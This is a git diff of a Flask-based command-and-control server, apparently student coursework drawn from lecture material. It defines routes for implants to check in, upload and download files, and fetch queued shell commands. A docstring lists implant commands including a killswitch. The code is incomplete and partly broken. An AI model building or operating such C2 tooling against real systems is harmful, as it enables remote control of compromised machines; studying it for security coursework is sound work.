@@ -1,7 +1,7 @@
 ##from lecture slides, refrenced 0xRick c2 code
 
 import sqlite3
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 import threading
 import os, sys, random, string
 from app.models.agent import agents
@@ -12,7 +12,7 @@ from app.app import createFlaskApp
 import uuid
 from werkzeug.utils import secure_filename
 from app.models.base import db
-import flask_sqlalchemy
+from flask_sqlalchemy import SQLAlchemy as sql
 
 
 """控制端表"""
@@ -37,16 +37,16 @@ implant commands
 3 = killswitch
 """
 
+path = "/Users/oliviazhou/Desktop/"
+if os.path.exists(path) == False:
+    os.mkdir(path)
+app.config['UPLOAD_FOLDER'] = path
 
 
-@app.route("/upload/<filename>", methods = ["POST"])
+@app.route("/upload/<filename>", methods = ["GET", "POST"])
 def upload_files(filename):
 #from flask documentation
     if request.method == 'POST':
-        path = "data/listeners/{__name__}/"
-        if os.path.exists(path) == False:
-            os.mkdir(path)
-        app.config['UPLOAD_FOLDER'] = path
         print("make sure your file exists and is in the correct directory")
         if 'file' not in request.files:
             Flask.flash('No file part')
@@ -63,7 +63,7 @@ def upload_files(filename):
 @app.route('/downloads/<filename>', methods = ["GET"])
 def download_file(filename):
     #update last_seen in database
-    return request.send_from_directory(app.config["UPLOAD_FOLDER"], filename)
+    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)
 
 
 @app.route("/checkin", methods=["POST", "GET"])
@@ -71,7 +71,7 @@ def check_in():
     global TASKS, SHELL
     if request.method == "POST":
         whoami = request.get_json()
-        if flask_sqlalchemy.session.query(db).filter(whoami).count() != 0:
+        if sql.session.query(db).filter(whoami).count() != 0:
             #update last_seen in database
             lock.acquire()
             try:
@@ -133,12 +133,12 @@ def get_shell_commands():
     command = request.get_json()
     lock.acquire()
     try:
-        shellcommand = command["shellcommand"]
+        shellcommand = command[0]
         SHELL.append(shellcommand)
     finally:
         lock.release()
     print("accepted shell_code")
-    return "Success"
+    return "True"
     
 def encryptionkey():
     #if encryptionkey == None:
